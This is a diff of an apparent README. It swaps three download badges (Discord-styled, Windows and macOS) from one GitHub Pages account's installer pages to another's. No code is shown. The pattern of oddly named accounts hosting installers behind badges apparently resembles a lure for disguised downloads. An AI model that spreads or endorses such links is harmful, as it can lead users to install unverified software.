@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
+[![Download](https://img.shields.io/badge/Download-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://ForbiddenTechnician.github.io/install-windows/)
 
 </div>
 
@@ -51,9 +51,9 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://ForbiddenTechnician.github.io/install-windows/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://ForbiddenTechnician.github.io/install-macos/)
 
 </div>
 
@@ -70,7 +70,7 @@
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/Download-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
+[![Download](https://img.shields.io/badge/Download-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://ForbiddenTechnician.github.io/install-windows/)
 
 </div>
 
